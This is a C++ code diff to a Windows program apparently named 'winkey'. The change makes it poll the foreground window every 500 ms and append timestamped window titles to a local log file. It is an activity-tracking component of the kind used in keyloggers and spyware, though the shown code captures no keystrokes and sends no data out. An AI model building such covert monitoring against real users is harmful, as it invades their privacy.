@@ -1,43 +1,52 @@
 #include "winkey.hpp"
 
-std::ofstream   logFile;
+std::wofstream  logFile;
+HWND            lastWindow = nullptr;
 
 void LogForegroundWindow(void) {
     // Get a handle to the currently focused window
     HWND    hwnd = GetForegroundWindow();
+    // Only log if the focused window has changed
+    if (!hwnd || hwnd == lastWindow) return;
+    lastWindow = hwnd;
 
-    char    windowTitle[256];
-    GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle) / sizeof(char));
+    // We use wide characters (wchar_t) + Unicode (W) version of the function
+    wchar_t windowTitle[256];
+    GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));
 
     time_t      now = time(nullptr);
+    // Converts time_t into a tm structure representing the local time
+    //  (hours, minutes, day, month, etc.)
     struct tm   localTime {};
-    localtime_s(&localTime, &now);
+    if (localtime_s(&localTime, &now)) return;
 
-    logFile << "[" << std::setfill('0')
-            << std::setw(2) << localTime.tm_mday << "."
-            << std::setw(2) << (localTime.tm_mon + 1) << "."
-            << (localTime.tm_year + 1900) << " "
-            << std::setw(2) << localTime.tm_hour << ":"
-            << std::setw(2) << localTime.tm_min << ":"
-            << std::setw(2) << localTime.tm_sec << "] - '"
-            << windowTitle << "'" << std::endl;
+    // Add log to the logfile `[date time] - 'WINDOW_TITLE'`
+    // `L` is for wide characters (Unicode)
+    logFile << L"[" << std::setfill(L'0')
+            << std::setw(2) << localTime.tm_mday << L"."
+            << std::setw(2) << (localTime.tm_mon + 1) << L"."
+            << (localTime.tm_year + 1900) << L" "
+            << std::setw(2) << localTime.tm_hour << L":"
+            << std::setw(2) << localTime.tm_min << L":"
+            << std::setw(2) << localTime.tm_sec << L"] - '"
+            << windowTitle << L"'" << std::endl;
 }
 
 int main(void) {
-    try {
-        // Open the outfile in appending mode
-        logFile.open("winkey.log", std::ios::app);
-        if (!logFile.is_open()) {
-            std::cerr << "Failed to open log file." << std::endl;
-            return 1;
-        }
-
-        LogForegroundWindow();
-
-        logFile.close();
-    } catch (const std::exception &e) {
-        std::cerr << "Caught exception: " << e.what() << std::endl;
+    // Open the outfile in appending mode
+    logFile.open("winkey.log", std::ios::app);
+    if (!logFile.is_open()) {
+        std::cerr << "Failed to open log file." << std::endl;
+        return 1;
     }
+
+    while (1) {
+        LogForegroundWindow();
+        // Check every 500ms
+        std::this_thread::sleep_for(std::chrono::milliseconds(500));
+    }
+
+    logFile.close();
 
     return 0;
 }
